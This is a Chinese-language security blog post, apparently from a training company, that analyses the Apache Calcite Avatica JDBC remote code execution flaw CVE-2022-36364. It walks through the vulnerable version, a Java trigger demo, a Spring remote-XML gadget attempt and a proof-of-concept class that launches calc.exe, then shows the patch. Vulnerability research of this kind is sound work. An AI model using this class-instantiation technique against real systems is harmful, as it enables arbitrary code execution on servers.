#  Apache Calcite Avatica 远程代码执行   
 蚁景网安   2025-05-13 08:31  
  
前段时间看到Apache Calcite Avatica远程代码执行漏洞 CVE-2022-36364 在网上搜索也没有找到相关的分析和复现文章，于是想着自己研究一下，看能不能发现可以利用的方法。  
  
首先利用一下最近比较热门的 Deepseek ，询问他是否清楚漏洞相关的信息。  
  
![image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldwadTmCI6Db72o5TibNjjYhXibhGE28QZtStibViaQcy8XE4rCiawI9Liac7vgNoCibREU9XjaS2pJnM5lSw/640?wx_fmt=other&from=appmsg "")  
  
![image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldwadTmCI6Db72o5TibNjjYhXjN3ic80suPGz4kqmWEKnKe05zWvYUSFe0O3uXkx9eWs0jNh2FnYJ5QA/640?wx_fmt=other&from=appmsg "")  
  
通过回答我们可以了解到这个漏洞的概况，具体漏洞的版本，以及漏洞产生的原因。  
## 漏洞简介  
  
Apache Calcite Avatica JDBC 驱动程序根据通过 httpclient_impl  
 连接属性提供的类名来创建 HTTP 客户端实例；但是在驱动程序实例化之前不会验证该类是否实现了预期的接口，这样一来就会导致可以通过调用任意类来执行代码。  
  
执行这个漏洞并造成一定的危害性，还需要两个先决条件：  
- 必须拥有控制 JDBC 连接参数的权限  
  
- 类路径中有一个具有 URL 参数和执行代码能力的函数（目前需要自己构造）  
  
## 漏洞复现&分析  
  
简单点，通过 maven 来创建漏洞环境  
```
<!-- https://mvnrepository.com/artifact/org.apache.calcite.avatica/avatica -->
<dependency>
    <groupId>org.apache.calcite.avatica</groupId>
    <artifactId>avatica</artifactId>
    <version>1.21.0</version>
</dependency>
```  
  
创建完成漏洞环境后，我们就需要来编写一段代码想办法触发这个漏洞，我个人的建议是通过对比代码补丁，一般来说修复完成代码后，总会写一个测试类来进行测试  
  
![image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldwadTmCI6Db72o5TibNjjYhXibAJCK7wOoNFJw5QFbrcucMxp4uPXVficqWaKadp1jQlZhk9ncpOzcQw/640?wx_fmt=other&from=appmsg "")  
```
import org.apache.calcite.avatica.BuiltInConnectionProperty;
import org.apache.calcite.avatica.ConnectionConfig;
import org.apache.calcite.avatica.ConnectionConfigImpl;
import org.apache.calcite.avatica.remote.AvaticaHttpClient;
import org.apache.calcite.avatica.remote.AvaticaHttpClientFactory;
import org.apache.calcite.avatica.remote.AvaticaHttpClientFactoryImpl;
import java.net.URL;
import java.util.Properties;

public class test {
    public static void main(String[] args) throws Exception {
        Properties props = new Properties();
        props.setProperty(BuiltInConnectionProperty.HTTP_CLIENT_IMPL.name(),"className");
        URL url = new URL("url");
        ConnectionConfig config = new ConnectionConfigImpl(props);
        AvaticaHttpClientFactory httpClientFactory = new AvaticaHttpClientFactoryImpl();
        AvaticaHttpClient client = httpClientFactory.getClient(url, config, null);
    }
}
```  
  
这样一来我们就编写了一个漏洞 Demo  calssName  
 和 url  
 的值是我们可以操作控制的，我们进行调试分析一下  
  
![image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldwadTmCI6Db72o5TibNjjYhX5KQ5g2zvWQRa4JYnFgxviaM31T8RFufj7a1tic9mia5sj8DCP2gonKGxA/640?wx_fmt=other&from=appmsg "")  
  
org.apache.calcite.avatica.remote.AvaticaHttpClientFactoryImpl#getClient  
  
![image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldwadTmCI6Db72o5TibNjjYhXn7q3YoQ7q04wMicw2ScxgGkk9yzmfFaKyRvsQP7zGJ6yQV03ibxf6EAQ/640?wx_fmt=other&from=appmsg "")  
  
这个地方我们就注意到了最后调用 instantiateClient  
 来处理的两个参数 className 和 url 一个来自于直接传参，另一个来自于 config.httpClientClass()  
 会从 config 对象中获取 HTTP 客户端的实现类名称，并将其作为一个 String  
 返回  
  
![image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldwadTmCI6Db72o5TibNjjYhX41t6dEKPYltH9G6GyrOZb5021nsvbicq8OJax8BRTQwntr4slQ99FUw/640?wx_fmt=other&from=appmsg "")  
  
‍  
  
所以当参数传入到 org.apache.calcite.avatica.remote.AvaticaHttpClientFactoryImpl#instantiateClient  
 其中的两个参数 className  
 和 url  
 都是我们可以控制的  
  
![image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldwadTmCI6Db72o5TibNjjYhXpmFLW1L15MLMdrQzk4ZUDd2J6xUGQ7TGFyzHbpMkjSPeUomvxnJtJA/640?wx_fmt=other&from=appmsg "")  
  
不需要向下继续调试，我们就看到了关键代码 constructor.newInstance(Objects.requireNonNull(url));  
  
这样一来我们就可以通过控制 className  
 和 url  
 来实现调用任意类，但是这个类的必须有 URL 参数的处理  
  
刚开始想到的方法是  
  
利用 spring 中的类构造函数加载远程配置实现 RCE  
- org.springframework.context.support.ClassPathXmlApplicationContext  
  
```
import org.springframework.context.support.ClassPathXmlApplicationContext;
public class JXpathDemo {
    public static void main(String[] args) {
        String s = "http://127.0.0.1:8080/bean.xml";
        ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(s);
    }
}
```  
  
似乎如此一来就满足了条件，我们先试试  
  
![image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldwadTmCI6Db72o5TibNjjYhXVpUoiab27wK5ZdXiblp1P8Wo7EqJZtF4WQTx2HcGvkL71EkNxzZIRg9Q/640?wx_fmt=other&from=appmsg "")  
  
爆出了一个错误，我们注意到 lassPathXmlApplicationContext  
 类没有接收 java.net.URL  
 参数的构造方法。ClassPathXmlApplicationContext  
 类的构造方法接收的是 String  
 类型的路径，通常是用于加载 Spring 配置文件的路径。  
  
![image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldwadTmCI6Db72o5TibNjjYhX455WfGNva0xEg2l9yjwf0eCVp1KLJJG1YianGqICZiaxPTuqDrppJ1VQ/640?wx_fmt=other&from=appmsg "")  
  
所以这种利用方式适用于很多种情况 Apache Commons JXPath 远程代码执行、PostgresQL JDBC Driver 任意代码执行 等，但是并不适配当前的环境。(目前还没有找到合适的类来触发利用这种漏洞)  
  
为了进一步体现危害性，我自己创建一个类来体现  
```
import java.net.URL;

public class CustomHttpClient {
    private URL url;

    // 构造函数，接受一个 URL 类型的参数
    public CustomHttpClient(URL url) throws Exception {
        Runtime.getRuntime().exec("calc.exe");
    }
}
```  
  
![7](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldwadTmCI6Db72o5TibNjjYhXqNBJcPnMW5152p7ic6hz3gbImic28LQ8Q0DF8IaHiaUX0LRheyy3LbF3g/640?wx_fmt=other&from=appmsg "")  
## 漏洞修复  
  
通过对比我们发现对传入的类进行了控制，限定必须属于AvaticaHttpClient  
 的子类  
  
https://github.com/apache/calcite-avatica/commit/0c097b6a685fc1f97f151505a219976f15ed0c4c?diff=split&w=0  
  
![image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldwadTmCI6Db72o5TibNjjYhXcjkmK3RuMOSU4CQWNjySXZ3iatQfgNI5mhZyANHA2srbUt92EJtgWaA/640?wx_fmt=other&from=appmsg "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6iavic0tIJIoZCwKvUYnFFiaibgSm6mrFp1ZjAg4ITRicicuLN88YodIuqtF4DcUs9sruBa0bFLtX59lQQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
学习  
网安实战技能课程  
，戳  
“阅读原文”  
  
